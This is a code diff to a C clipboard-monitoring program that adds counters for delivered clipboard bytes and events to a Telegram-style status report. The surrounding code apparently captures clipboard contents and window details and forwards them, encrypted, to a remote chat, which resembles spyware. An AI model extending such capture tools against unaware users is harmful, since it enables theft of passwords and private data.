@@ -62,6 +62,8 @@ static size_t retry_delay_ms;
 static int stopping;
 static int worker_started;
 static volatile int clipboard_paused;
+static uint64_t total_clipboard_bytes;
+static uint64_t total_clipboard_events;
 
 #ifdef _WIN32
 static CRITICAL_SECTION queue_mutex;
@@ -212,6 +214,10 @@ static void deliver_event(const clipboard_event_t *event)
 
     for (size_t attempt = 1; attempt <= delivery_attempts; ++attempt) {
         if (deliver_encrypted_payload(event, source)) {
+            queue_lock();
+            total_clipboard_bytes += event->length;
+            total_clipboard_events++;
+            queue_unlock();
             return;
         }
         if (attempt < delivery_attempts) {
@@ -337,6 +343,8 @@ void clipboard_get_status_info(char *buffer, size_t max_len)
     queue_lock();
     size_t cur_items = queue_items;
     size_t cur_bytes = queue_bytes;
+    uint64_t tot_bytes = total_clipboard_bytes;
+    uint64_t tot_events = total_clipboard_events;
     queue_unlock();
 
     char size_str[32] = {};
@@ -348,6 +356,15 @@ void clipboard_get_status_info(char *buffer, size_t max_len)
         snprintf(size_str, sizeof(size_str), "%.2f MB", (double)cur_bytes / (1024.0 * 1024.0));
     }
 
+    char tot_str[64] = {};
+    if (tot_bytes < 1024) {
+        snprintf(tot_str, sizeof(tot_str), "%llu B", (unsigned long long)tot_bytes);
+    } else if (tot_bytes < 1024 * 1024) {
+        snprintf(tot_str, sizeof(tot_str), "%.2f KB (%llu B)", (double)tot_bytes / 1024.0, (unsigned long long)tot_bytes);
+    } else {
+        snprintf(tot_str, sizeof(tot_str), "%.2f MB (%llu bytes)", (double)tot_bytes / (1024.0 * 1024.0), (unsigned long long)tot_bytes);
+    }
+
     const char *status_str = config->disable_clipboard
         ? "❌ <b>DISABLED</b> (Configured OFF)"
         : (paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Monitoring)");
@@ -355,6 +372,7 @@ void clipboard_get_status_info(char *buffer, size_t max_len)
     snprintf(buffer, max_len,
              "📋 <b>Clipboard Monitor Status</b>\n\n"
              "• <b>Status:</b> %s\n"
+             "• <b>Total Delivered:</b> %s in %llu events\n"
              "• <b>Delivery Queue:</b> %llu items (%s)\n"
              "• <b>Queue Limits:</b> %llu items / %llu MB\n"
              "• <b>File Handling:</b> %s\n"
@@ -363,6 +381,7 @@ void clipboard_get_status_info(char *buffer, size_t max_len)
              "• <b>RAM Encryption:</b> 🔒 Active (ChaCha20-Poly1305)\n"
              "• <b>Delivery Retry:</b> %llu attempts (%llu ms delay)",
              status_str,
+             tot_str, (unsigned long long)tot_events,
              (unsigned long long)cur_items, size_str,
              (unsigned long long)config->queue_max_items,
              (unsigned long long)(config->queue_max_bytes / (1024 * 1024)),
@@ -371,6 +390,22 @@ void clipboard_get_status_info(char *buffer, size_t max_len)
              config->telegram_send_window_info ? "Enabled" : "Disabled",
              (unsigned long long)config->delivery_attempts,
              (unsigned long long)config->retry_delay_ms);
+}
+
+uint64_t clipboard_get_total_bytes(void)
+{
+    queue_lock();
+    uint64_t val = total_clipboard_bytes;
+    queue_unlock();
+    return val;
+}
+
+uint64_t clipboard_get_total_events(void)
+{
+    queue_lock();
+    uint64_t val = total_clipboard_events;
+    queue_unlock();
+    return val;
 }
 
 void clipboard_output(const void *data, size_t length, const char *mime_type,
